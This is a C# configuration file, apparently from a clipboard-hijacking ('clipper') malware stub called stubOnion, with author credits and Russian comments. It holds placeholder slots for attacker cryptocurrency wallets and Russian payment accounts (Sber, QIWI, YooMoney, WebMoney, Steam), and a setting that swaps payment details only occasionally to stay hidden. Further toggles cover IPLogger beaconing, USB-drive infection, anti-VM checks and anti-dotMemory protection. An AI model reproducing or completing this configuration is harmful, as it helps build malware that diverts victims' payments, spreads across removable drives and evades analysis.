/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
namespace stubOnion
{
    class Config
    {
        // Крипта
        public static string[] walletsbtc = new string[] { 
            "--- BTC ---" 
        };
        public static string[] walletseth = new string[] { 
            "--- Etherium ---"
        };
        public static string[] walletsltc = new string[] {
            "--- LiteCoin ---"
        };
       public static string[] walletsxmr = new string[] {
            "--- Monero ---"
        };
// Карты
        public static string visasbr = "--- SBER ---";
        public static string mcsbr = "--- MSB ---";
        public static string qiwicrd = "--- QIWIC ---";

        // Разное
        public static string qiwi = "--- QIWI ---";
        public static string ymoney = "--- YANDEXMONEY ---";
        public static string steam = "--- STEAM ---";
        public static string mega = "--- MEGAD ---";
        public static string ydisk = "--- YDISK ---";
        public static string donat = "--- DONAT ---";

        // Копилка киви
        public static string qiwime = "--- QIWIKOP ---";

        // Перевод по никнейму
        public static string qiwinick = "--- QIWINIK ---";

        public static string payeer = "--- PAYER ---";
        public static string wmr = "--- WMR ---";
        public static string wmz = "--- WMZ ---";
        public static string wmx = "--- WMX ---";
        public static string wmu = "--- WMU ---";

        // Подменять не сильно часто(небольшой рандом для скрытности) например 3, 1 раз подмена 3 раза пропускаем
        public static int OppToMissDef = 2;

        //Ссылка на IPLogger
        public static string urllogger = "--- IPL ---";

        // Отстук IPLogger
        public static string logger = "--- logger ---"; // 1 Включить | 0 выключить

        // Заражение USB  
        public static string Infectionusb = "--- Infectionusb ---"; // 1 Включить | 0 выключить

        // АнтиВМ
        public static string antivm = "--- antivm ---";  // 1 Включить | 0 выключить

        // Защита от dotMemory
        public static string dotmemory = "--- dotmemory ---";  // 1 Включить | false выключить

    }
}
